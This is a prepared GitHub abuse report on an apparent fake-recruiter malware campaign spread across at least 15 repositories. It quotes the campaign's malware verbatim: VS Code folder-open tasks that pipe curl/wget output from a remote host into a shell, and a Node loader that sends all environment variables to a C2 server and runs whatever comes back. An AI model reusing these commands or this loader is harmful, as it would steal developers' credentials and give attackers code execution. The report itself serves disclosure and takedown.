# Abuse report — GitHub Trust & Safety

**Submission target:** https://github.com/contact/report-abuse → select *"I want to report abuse or spam"* → *"Malware or exploits"*

**How to use this file**

1. Copy the contents of the **Subject** code block below into the ticket's subject / title field.
2. Copy the contents of the **Body** code block below into the ticket's description field. The body is written as plain text — it reads sensibly even though the abuse form doesn't render Markdown.
3. The body is **campaign-wide** — it covers all ≥15 known repositories in this cluster, not just `AjunaWorkHub/AjunaVerse_MVP`. If you are filing on behalf of a specific affected repo other than AjunaVerse, edit only the *Subject* and the *"Reporting on behalf of"* line near the top of the body to lead with whichever repo you encountered. The rest of the body stays unchanged.

(On the rendered GitHub view of this file, hover over each code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version.)

---

## Subject

```text
Coordinated multi-org developer-targeting malware campaign on GitHub — at least 15 repositories across the AjunaWorkHub, AetSoftWorkHub, and DLabsHungary-Hub9 organizations (plus individual accounts) deliver RCE and credential-theft payloads to developers via fake recruiting outreach
```

## Body

```text
SUMMARY

This is a CAMPAIGN-LEVEL abuse report covering an active, operationally-coordinated developer-targeting malware operation distributing remote-code-execution and credential-theft payloads via at least 15 GitHub repositories spread across multiple organizations and individual accounts. The repositories share an identical loader idiom and have been enumerated via GitHub code search on the distinctive strings "verify(setApiKey(process.env.AUTH_API))" and 'new Function("require", response.data)'. The TTPs match the publicly-documented "Contagious Interview" cluster (fake-recruiter cold outreach -> instruction to clone and run a "Web3 MVP" repository ahead of an interview -> compromise on first run).

Reporting on behalf of: https://github.com/AjunaWorkHub/AjunaVerse_MVP (worked example; see "Technical mechanism" below). Cluster-wide takedown is the requested action.


KNOWN CAMPAIGN REPOSITORIES

Current generation (loader at server/routes/api/auth.js) -- high confidence operator-owned or operator-controlled:

- https://github.com/AjunaWorkHub/AjunaVerse_MVP
- https://github.com/AetSoftWorkHub/AetSoft_MVP
- https://github.com/DLabsHungary-Hub9/DLabs-Platform-MVP2
- https://github.com/roamanbuild/OnyxVerse
- https://github.com/khaleb-dev/jackpot
- https://github.com/rony1235/Jp-Soccer
- https://github.com/mspkteam/williampotter

Earlier generation (loader at app/controllers/frontController.js -- same loader code, different scaffold) -- medium confidence, please investigate before suspending the account; some may be compromised legitimate developer accounts rather than operator-owned:

- https://github.com/Andrii-888/0gRollplay
- https://github.com/prahaladbelavadi/CoinLocatorDemo
- https://github.com/sky-cook/tokentradingdapp
- https://github.com/WilliamSuhosky/Property-Voting-DApp
- https://github.com/artemus-jarrett/blockchain-voting-system
- https://github.com/TechByteX/NitroGem
- https://github.com/jamesm-dev/NitroGem
- https://github.com/dappfusion/defi-real-estate
- https://github.com/InvescoHub/defi-real-estate

Highest-confidence operator-controlled identities (appropriate targets for org/user-level suspension):

- Org: AjunaWorkHub (GitHub id 276264331, created 2026-04-27)
- Org: AetSoftWorkHub (GitHub id 276275397, created 2026-04-27 -- adjacent ID, same day, bit-identical .vscode/tasks.json)
- Org: DLabsHungary-Hub9
- User: GitWorkHub9 (id 272514006) -- sole committer to AjunaVerse_MVP, commit author email fatihafariya8+2@gmail.com (Gmail "+N" alias convention implies parallel personas)
- User: GitWorkHub99 (id 213663943) -- approximately 20 "credibility farming" clones of widely-used open-source projects (llama.cpp, prettier, angular-cli, nuxt.com, Xray-core, etc.) plus a sibling campaign repo "AetSoftVerse"


TECHNICAL MECHANISM (worked example: AjunaWorkHub/AjunaVerse_MVP at commit bac3362000a9332a490c763feb847995ea412b46)

The repositories carry three INDEPENDENT code-execution vectors. Any one of them is sufficient to fully compromise a developer's workstation. They are redundant by design so that even if one is neutralized the others still fire.

(1) VS Code tasks.json auto-run on folder open.
    File: https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/.vscode/tasks.json
    Blob SHA: 998c34f02d94169a546b4c36123d552dd14f985b (BIT-IDENTICAL between AjunaVerse_MVP and AetSoft_MVP, proving operator coordination)
    Defines a task with "runOn": "folderOpen" and these per-OS commands:
      osx:     curl -L 'https://vscode-settings-0506.vercel.app/api/settings/mac' | bash
      linux:   wget -qO- 'https://vscode-settings-0506.vercel.app/api/settings/linux' | sh
      windows: curl --ssl-no-revoke -L https://vscode-settings-0506.vercel.app/api/settings/windows | cmd
    All output is suppressed ("reveal": "silent", "echo": false, "focus": false, "panel": "new", "close": true). The malicious lines are also padded with ~200 trailing spaces so the commands sit far off the right edge of a single line in any non-wrapping editor -- deliberate hide-in-plain-sight obfuscation.

(2) package.json "prepare" lifecycle hook.
    File: https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/package.json
    Sets "prepare": "node server/server.js", which causes the in-repo Express server to launch during ordinary "npm install" (prepare is less notorious than postinstall and tends to escape security review). Additionally, all of start, build, test, and eject pipe "node server/server.js" into "react-scripts", so any normal "run the project" command also launches the malicious server.

(3) Server boot-time process.env exfiltration + arbitrary Node RCE.
    Files: https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/routes/api/auth.js (lines 18-36) and https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/controllers/auth.js (lines 67-72).
    On module load, the code POSTs { ...process.env } to a base64-obfuscated URL committed in .env as
      AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=
    which decodes to https://ip-core-api-one.vercel.app/api, and then executes the response body as JS via "new Function('require', response.data)(require)". The injected "require" gives the attacker access to fs, child_process, etc. -- full arbitrary Node RCE running as the developer's user. The POST body is the developer's entire shell environment (any AWS_*, GITHUB_TOKEN, NPM_TOKEN, OPENAI_API_KEY, ANTHROPIC_API_KEY, etc. they have exported).
    Verbatim primitive:
        const setApiKey = (s) => atob(s);
        const verify = (api) =>
          axios.post(api, { ...process.env }, { headers: { "x-app-request": "ip-check" } });
        // at module top level:
        verify(setApiKey(process.env.AUTH_API))
          .then((response) => {
            const executor = new Function("require", response.data);
            executor(require);
          });
    The wrapper names "setApiKey" and "verify" are semantic misdirection -- there is no API key and no verification. The accompanying console log "Aborting mempool scan due to failed API verification." is also misdirection: there is no mempool scan anywhere in the codebase.


ACCEPTABLE USE POLICY VIOLATIONS

The repositories violate GitHub's Acceptable Use Policies (https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) -- specifically:

- the prohibition on content that "directly supports unlawful active attacks or malware campaigns that are causing technical harms,"
- the prohibitions on phishing and social engineering, and
- the prohibition on malware delivery.

Intent is established by the base64 obfuscation of the C2 URL in committed .env, the whitespace-padding obfuscation of the malicious commands in .vscode/tasks.json, the semantic misdirection in the loader's wrapper-function names ("setApiKey", "verify", "validateApiKey"), and the misleading console log strings ("Aborting mempool scan...") accompanying code that performs neither mempool scanning nor API verification.


REQUESTED ACTIONS

1. Take down all CURRENT-GENERATION repositories listed above:
   - AjunaWorkHub/AjunaVerse_MVP
   - AetSoftWorkHub/AetSoft_MVP
   - DLabsHungary-Hub9/DLabs-Platform-MVP2
   - roamanbuild/OnyxVerse
   - khaleb-dev/jackpot
   - rony1235/Jp-Soccer
   - mspkteam/williampotter

2. Suspend the operator-controlled organizations: AjunaWorkHub (id 276264331), AetSoftWorkHub (id 276275397), DLabsHungary-Hub9.

3. Suspend the operator-controlled user accounts: GitWorkHub9 (id 272514006), GitWorkHub99 (id 213663943).

4. For EARLIER-GENERATION repositories, please investigate before suspending the account -- some accounts may be compromised legitimate developers who would need account recovery rather than suspension. The repositories themselves should be taken down regardless.

5. Consider adding the distinctive code strings -- 'verify(setApiKey(process.env.AUTH_API))', 'new Function("require", response.data)', and the header 'x-app-request: ip-check' -- to GitHub's malware-content scanning to catch future iterations of this campaign.


CORROBORATING THIRD-PARTY DOCUMENTATION

The campaign is documented by at least six independent researchers, satisfying any "weaponized in the wild" requirement:

- defdone/rtidx-evidence -- reports/amonixplay-evidence-report.md (analysis of an earlier sibling)
- oliver-zehentleitner/technopathy
- reymom/portfolio-site -- content/security/2026-04-15-supply-chain-attack.mdx
- nickgallick/perlantir-fleet -- references the campaign in a supply-chain-audit skill
- S0AndS0/S0AndS0.github.io -- misc/_scammers/2026-04-10_Larry-Bogie-of-BitAngels-Investment-Group.md
- jamesm-dev/NitroGem -- SECURITY_FINDINGS.md (captured loader file with annotations)
```

---

## Supporting artifacts (for your reference; do not paste these into the ticket)

- Full technical analysis: [`README.md`](./README.md)
- IOCs in machine-readable form: [`iocs.csv`](./iocs.csv), [`iocs.json`](./iocs.json)
- Detection rules: [`detection-rules.md`](./detection-rules.md)
- Companion abuse report for the Vercel-hosted C2: [`abuse-report-vercel.md`](./abuse-report-vercel.md)
